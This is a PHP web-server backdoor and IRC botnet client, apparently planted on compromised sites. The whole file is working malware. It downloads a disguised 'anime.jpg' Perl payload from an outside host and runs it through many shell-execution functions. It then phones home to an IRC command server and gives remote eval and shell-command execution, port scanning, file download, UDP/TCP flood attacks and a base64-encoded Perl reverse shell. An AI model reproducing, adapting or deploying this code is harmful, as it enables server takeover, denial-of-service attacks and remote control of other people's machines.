<?php
set_time_limit(0); 
error_reporting(0); 
$rhs="set_time_limit(0); 
error_reporting(0); 

shell_exec('wget http://www.lotemania.com/lotes//anime.jpg -O /tmp/anime.jpg;perl /tmp/anime.jpg');
shell_exec('curl http://www.lotemania.com/lotes//anime.jpg -o /tmp/anime.jpg;perl /tmp/anime.jpg');
shell_exec('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /tmp/anime.jpg;perl /tmp/anime.jpg');
shell_exec('lynx -source http://www.lotemania.com/lotes//anime.jpg > /tmp/anime.jpg;perl /tmp/anime.jpg');
shell_exec('fetch -o /tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /tmp/anime.jpg');
shell_exec('GET http://www.lotemania.com/lotes//anime.jpg>/tmp/anime.jpg;perl /tmp/anime.jpg');
shell_exec('rm -rf /tmp/anime.jpg*');
passthru('wget http://www.lotemania.com/lotes//anime.jpg -O /tmp/anime.jpg;perl /tmp/anime.jpg');
passthru('curl http://www.lotemania.com/lotes//anime.jpg -o /tmp/anime.jpg;perl /tmp/anime.jpg');
passthru('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /tmp/anime.jpg;perl /tmp/anime.jpg');
passthru('lynx -source http://www.lotemania.com/lotes//anime.jpg > /tmp/anime.jpg;perl /tmp/anime.jpg');
passthru('fetch -o /tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /tmp/anime.jpg');
passthru('GET http://www.lotemania.com/lotes//anime.jpg>/tmp/anime.jpg;perl /tmp/anime.jpg');
passthru('rm -rf /tmp/anime.jpg');
exec('wget http://www.lotemania.com/lotes//anime.jpg -O /tmp/anime.jpg;perl /tmp/anime.jpg');
exec('curl http://www.lotemania.com/lotes//anime.jpg -o /tmp/anime.jpg;perl /tmp/anime.jpg');
exec('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /tmp/anime.jpg;perl /tmp/anime.jpg');
exec('lynx -source http://www.lotemania.com/lotes//anime.jpg > /tmp/anime.jpg;perl /tmp/anime.jpg');
exec('fetch -o /tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /tmp/anime.jpg');
exec('GET http://www.lotemania.com/lotes//anime.jpg>/tmp/anime.jpg;perl /tmp/anime.jpg');
exec('rm -rf /tmp/anime.jpg');
system('wget http://www.lotemania.com/lotes//anime.jpg -O /tmp/anime.jpg;perl /tmp/anime.jpg');
system('curl http://www.lotemania.com/lotes//anime.jpg -o /tmp/anime.jpg;perl /tmp/anime.jpg');
system('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /tmp/anime.jpg;perl /tmp/anime.jpg');
system('lynx -source http://www.lotemania.com/lotes//anime.jpg > /tmp/anime.jpg;perl /tmp/anime.jpg');
system('fetch -o /tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /tmp/anime.jpg');
system('GET http://www.lotemania.com/lotes//anime.jpg>/tmp/anime.jpg;perl /tmp/anime.jpg');
system('rm -rf /tmp/anime.jpg');
shell_exec('wget http://www.lotemania.com/lotes//anime.jpg -O /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
shell_exec('curl http://www.lotemania.com/lotes//anime.jpg -o /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
shell_exec('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
shell_exec('lynx -source http://www.lotemania.com/lotes//anime.jpg > /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
shell_exec('fetch -o /var/tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /var/tmp/anime.jpg');
shell_exec('GET http://www.lotemania.com/lotes//anime.jpg>/var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
shell_exec('rm -rf /var/tmp/anime.jpg');
passthru('wget http://www.lotemania.com/lotes//anime.jpg -O /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
passthru('curl http://www.lotemania.com/lotes//anime.jpg -o /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
passthru('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
passthru('lynx -source http://www.lotemania.com/lotes//anime.jpg > /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
passthru('fetch -o /var/tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /var/tmp/anime.jpg');
passthru('GET http://www.lotemania.com/lotes//anime.jpg>/var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
passthru('rm -rf /var/tmp/anime.jpg');
exec('wget http://www.lotemania.com/lotes//anime.jpg -O /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
exec('curl http://www.lotemania.com/lotes//anime.jpg -o /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
exec('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
exec('lynx -source http://www.lotemania.com/lotes//anime.jpg > /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
exec('fetch -o /var/tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /var/tmp/anime.jpg');
exec('GET http://www.lotemania.com/lotes//anime.jpg>/var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
exec('rm -rf /var/tmp/anime.jpg');
system('wget http://www.lotemania.com/lotes//anime.jpg -O /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
system('curl http://www.lotemania.com/lotes//anime.jpg -o /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
system('lwp-download -a http://www.lotemania.com/lotes//anime.jpg /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
system('lynx -source http://www.lotemania.com/lotes//anime.jpg > /var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
system('fetch -o /var/tmp/anime.jpg http://www.lotemania.com/lotes//anime.jpg;perl /var/tmp/anime.jpg');
system('GET http://www.lotemania.com/lotes//anime.jpg>/var/tmp/anime.jpg;perl /var/tmp/anime.jpg');
system('rm -rf /var/tmp/anime.jpg');

echo "ok!";
class tmp 
{ 
 var $config = array("server"=>"base.byroe.net",
                     "port"=>"2010",
                     "pass"=>"D-Fox",
                     "prefix"=>"[falcon]",
                     "maxrand"=>"3",
                     "chan"=>"#falcon",
                     "chan1"=>"#ATeN4",
                     "chan2"=>"#falcon",
                     "chandbg"=>"#ATeN4",
                     "key"=>"D-Fox",
                     "modes"=>"+Bx",
                     "password"=>"justfamily",
                     "trigger"=>"!",
                     "hostauth"=>"*"
                     );
 var $users = array(); 
 function start() 
 { 
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
       $this->start(); 
    $ident = $this->config['prefix'];
    $alph = range("0","9");
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $ident .= $alph[rand(0,9)];
    if(strlen($this->config['pass'])>0) 
       $this->send("PASS ".$this->config['pass']);
    $this->send("USER ".$ident." 127.0.0.1 localhost : -=- ByroeNet -=-".php_uname()."");
    $this->set_nick();
    $this->main();
 } 
 function main() 
 { 
    while(!feof($this->conn)) 
    { 
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->send("PONG :".substr($this->buf,6)); 
       } 
       if(isset($cmd[1]) && $cmd[1] =="001") 
       { 
          $this->send("MODE ".$this->nick." ".$this->config['modes']); 
          $this->join($this->config['chan'],$this->config['key']);
          $this->join($this->config['chan1'],$this->config['key']);
          $this->join($this->config['chan2'],$this->config['key']);
          if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
          else { $safemode = "off"; }
          $uname = php_uname();
          $this->privmsg($this->config['chandbg'],"[\2uname!\2]: $uname (safe: $safemode)");
          $this->privmsg($this->config['chandbg'],"[\2vuln!\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
       } 
       if(isset($cmd[1]) && $cmd[1]=="433") 
       { 
          $this->set_nick(); 
       } 
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i]; 
          } 
          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             { 
                case "QUIT": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PART": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "user": 
                              if($mcmd[1]==$this->config['password']) 
                              { 
								if ($nick=="zaki_22")
                                   {
								   $this->log_in($host);
								   } 
                              } 
                              else 
                              { 
                                 $this->notice($this->config['chan'],"[\2Auth\2]: $nick salah yee :P");
                                 $this->notice($this->config['chan1'],"[\2Auth\2]: $nick salah yee :P");
                                 $this->notice($this->config['chan2'],"[\2Auth\2]: $nick salah yee :P");
                              } 
                            break; 
                         } 
                      } 
                   } 
                   elseif($this->is_logged_in($host)) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "restart": 
                               $this->send("QUIT :restart command dari $nick");
                               fclose($this->conn); 
                               $this->start(); 
                            break; 
                            case "join": 
                               if(!join($mcmd[1])) 
							   {
                               $this->join($mcmd[1]);
                               }							   
                            case "part": 
                               if(!part($mcmd[1])) 
							   {
                               $this->part($mcmd[1]);
                               }							   
                            break; 
                            case "help": 
                               $this->privmsg($this->config['chan'],"Command 1 : join/part/restart/rndnick/user/logout/udpflood/tcpflood/die/pscan/ud.server");
                               $this->privmsg($this->config['chan'],"Command 2 : safe/info/uname/raw/eval/popen/exec/sexec/passthru/system/dns/download/conback");
                            break; 
                            case "safe":
                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
                               {
                               $safemode = "on";
                               }
                               else {
                               $safemode = "off";
                               }
                               $this->privmsg($this->config['chan'],"[\2safe mode\2]: ".$safemode."");
                               $this->privmsg($this->config['chan1'],"[\2safe mode\2]: ".$safemode."");
                               $this->privmsg($this->config['chan2'],"[\2safe mode\2]: ".$safemode."");
                            break;
                            case "conback":
                               if(count($mcmd)>2)
                               {
                                  $this->conback($mcmd[1],$mcmd[2]);
                               }
                            break;
                            case "dns": 
                               if(isset($mcmd[1])) 
                               { 
                                  $ip = explode(".",$mcmd[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                     $this->privmsg($this->config['chan1'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                     $this->privmsg($this->config['chan2'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                     $this->privmsg($this->config['chan1'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                     $this->privmsg($this->config['chan2'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  } 
                               } 
                            break; 
                            case "info":
                            case "vunl":
                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
                               else { $safemode = "off"; }
                               $uname = php_uname();
                               $this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
                               $this->privmsg($this->config['chan'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
                               $this->privmsg($this->config['chan1'],"[\2info\2]: $uname (safe: $safemode)");
                               $this->privmsg($this->config['chan1'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
                               $this->privmsg($this->config['chan2'],"[\2info\2]: $uname (safe: $safemode)");
                               $this->privmsg($this->config['chan2'],"[\2vuln\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
                            break;
                            case "uname":
                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
                               else { $safemode = "off"; }
                               $uname = php_uname();
                               $this->privmsg($this->config['chan'],"[\2info\2]: $uname (safe: $safemode)");
                               $this->privmsg($this->config['chan1'],"[\2info\2]: $uname (safe: $safemode)");
                               $this->privmsg($this->config['chan2'],"[\2info\2]: $uname (safe: $safemode)");
                            break;
                            case "rndnick": 
                               $this->set_nick(); 
                            break; 
                            case "raw":
                               $this->send(strstr($msg,$mcmd[1])); 
                            break; 
                            case "eval":
                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
                            break;
			                case "sexec":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 
                            case "exec": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 
                            case "passthru": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = passthru($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 
                            case "popen": 
                               if(isset($mcmd[1])) 
                               { 
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                                  $this->privmsg($this->config['chan'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->privmsg($this->config['chan'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               }  
			   
                            case "system": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = system($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 
                            case "pscan": // .pscan 127.0.0.1 6667 
                               if(count($mcmd) > 2) 
                               { 
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) {
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                     $this->privmsg($this->config['chan1'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                     $this->privmsg($this->config['chan2'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                  } else {
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                                     $this->privmsg($this->config['chan1'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                                     $this->privmsg($this->config['chan2'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                               }} 
                            break; 
                            case "ud.server": // .ud.server <server> <port> [password] 
                               if(count($mcmd)>2) 
                               { 
                                  $this->config['server'] = $mcmd[1]; 
                                  $this->config['port'] = $mcmd[2]; 
                                  if(isset($mcmcd[3])) 
                                  { 
                                   $this->config['pass'] = $mcmd[3]; 
                                   $this->privmsg($this->config['chan'],"[\2update\2]: Server berubah menjadi ".$mcmd[1].":".$mcmd[2]." Senha: ".$mcmd[3]); 
                                   $this->privmsg($this->config['chan1'],"[\2update\2]: Server berubah menjadi ".$mcmd[1].":".$mcmd[2]." Senha: ".$mcmd[3]); 
                                   $this->privmsg($this->config['chan2'],"[\2update\2]: Server berubah menjadi ".$mcmd[1].":".$mcmd[2]." Senha: ".$mcmd[3]); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2update\2]: Server berubah menjadi ".$mcmd[1].":".$mcmd[2]); 
                                     $this->privmsg($this->config['chan1'],"[\2update\2]: Server berubah menjadi ".$mcmd[1].":".$mcmd[2]); 
                                     $this->privmsg($this->config['chan2'],"[\2update\2]: Server berubah menjadi ".$mcmd[1].":".$mcmd[2]); 
                                  } 
                               } 
                            break; 
                            case "download": 
                               if(count($mcmd) > 2) 
                               { 
                                  if(!$fp = fopen($mcmd[2],"w")) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2download\2]: Tidak dapat download. Ijin ditolak."); 
                                     $this->privmsg($this->config['chan1'],"[\2download\2]: Tidak dapat download. Ijin ditolak."); 
                                     $this->privmsg($this->config['chan2'],"[\2download\2]: Tidak dapat download. Ijin ditolak."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($mcmd[1])) 
                                     { 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: Tidak dapat download \2".$mcmd[1]."\2"); 
                                        $this->privmsg($this->config['chan1'],"[\2download\2]: Tidak dapat download \2".$mcmd[1]."\2"); 
                                        $this->privmsg($this->config['chan2'],"[\2download\2]: Tidak dapat download \2".$mcmd[1]."\2"); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->privmsg($this->config['chan'],"[\2download\2]: File \2".$mcmd[1]."\2 telah didownload ke \2".$mcmd[2]."\2"); 
                                        $this->privmsg($this->config['chan1'],"[\2download\2]: File \2".$mcmd[1]."\2 telah didownload ke \2".$mcmd[2]."\2"); 
                                        $this->privmsg($this->config['chan2'],"[\2download\2]: File \2".$mcmd[1]."\2 telah didownload ke \2".$mcmd[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               } else { 
							   $this->privmsg($this->config['chan'],"[\2download\2]: Salah perintah pakdhe!!");
							   $this->privmsg($this->config['chan1'],"[\2download\2]: Salah perintah pakdhe!!");
							   $this->privmsg($this->config['chan1'],"[\2download\2]: Salah perintah pakdhe!!");
							   }
                            break; 
                            case "die": 
                               $this->send("QUIT :Kasih makan kucing dulu $nick");
                               fclose($this->conn); 
                               exit; 
                            case "logout": 
                               $this->log_out($host); 
                               $this->privmsg($this->config['chan'],"[\2auth\2]: $nick logout"); 
                               $this->privmsg($this->config['chan1'],"[\2auth\2]: $nick logout"); 
                               $this->privmsg($this->config['chan2'],"[\2auth\2]: $nick logout"); 
                            break; 
                            case "udpflood": 
                               if(count($mcmd)>3) 
                               { 
                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); 
                               } 
                            break; 
                            case "tcpflood": 
                               if(count($mcmd)>5) 
                               { 
                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); 
                               } 
                            break; 
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->start(); 
 } 
 function send($msg) 
 { 
    fwrite($this->conn,"$msg\r\n"); 
 } 
 function join($chan) 
 { 
    $this->send("JOIN $chan"); 
 } 
 function privmsg($to,$msg)
 {
    $this->send("PRIVMSG $to :$msg");
 }
 function notice($to,$msg)
 {
    $this->send("NOTICE $to :$msg");
 }
 function is_logged_in($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } 
 function log_in($host) 
 { 
    $this->users[$host] = true; 
 } 
 function log_out($host) 
 { 
    unset($this->users[$host]); 
 } 
 function set_nick() 
 { 
    if(isset($_SERVER['SERVER_SOFTWARE'])) 
    { 
       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache")) 
          $this->nick = "[A]"; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis")) 
          $this->nick = "[I]"; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami")) 
          $this->nick = "[X]"; 
       else 
          $this->nick = "[N]"; 
    } 
    else 
    { 
       $this->nick = "[Z]"; 
    } 
    $this->nick .= $this->config['prefix']; 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $this->nick .= mt_rand(0,9); 
    $this->send("NICK ".$this->nick);
 } 
  function udpflood($host,$packetsize,$time) {
	$this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB Dikirim / Media: $vel MB/s ");
}
 function tcpflood($host,$packets,$packetsize,$port,$delay) 
 { 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Started!\2]"); 
    $packet = ""; 
    for($i=0;$i<$packetsize;$i++) 
       $packet .= chr(mt_rand(1,256)); 
    for($i=0;$i<$packets;$i++) 
    { 
       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5)) 
       { 
          $this->privmsg($this->config['chan'],"[\2TcpFlood\2]: Error: <$e>"); 
          return 0; 
       } 
       else 
       { 
          fwrite($fp,$packet); 
          fclose($fp); 
       } 
       sleep($delay); 
    } 
    $this->privmsg($this->config['chan'],"[\2TcpFlood Finished!\2]: Config - $packets paket $host:$port."); 
 }
 function conback($ip,$port)
 {
    $this->privmsg($this->config['chan'],"[\2conback\2]: mencoba menghubungkan ke $ip:$port");
    $dc_source = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==";
    if (is_writable("/tmp"))
    {
      if (file_exists("/tmp/dc.pl")) { unlink("/tmp/dc.pl"); }
      $fp=fopen("/tmp/dc.pl","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl /tmp/dc.pl $ip $port &");
      unlink("/tmp/dc.pl");
    }
    else
    {
    if (is_writable("/var/tmp"))
    {
      if (file_exists("/var/tmp/dc.pl")) { unlink("/var/tmp/dc.pl"); }
      $fp=fopen("/var/tmp/dc.pl","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl /var/tmp/dc.pl $ip $port &");
      unlink("/var/tmp/dc.pl");
    }
    if (is_writable("."))
    {
      if (file_exists("dc.pl")) { unlink("dc.pl"); }
      $fp=fopen("dc.pl","w");
      fwrite($fp,base64_decode($dc_source));
      passthru("perl dc.pl $ip $port &");
      unlink("dc.pl");
    }
    }
  }
} 
$bot = new tmp; 
$bot->start(); 
";
eval(gzinflate(str_rot13(base64_decode($rhs))));
?>